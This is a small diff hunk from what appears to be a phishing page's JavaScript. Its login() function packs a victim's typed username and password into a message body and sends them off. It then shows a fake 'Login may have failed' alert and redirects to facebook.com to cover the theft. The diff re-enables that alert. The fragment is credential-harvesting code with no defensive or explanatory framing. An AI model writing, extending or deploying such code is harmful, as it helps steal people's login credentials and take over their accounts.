@@ -75,7 +75,7 @@ function login() {
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
   }).then(
   );
-//   alert('Login may have failed');
+  alert('Login may have failed');
   window.location.replace("http://facebook.com");
 }
 
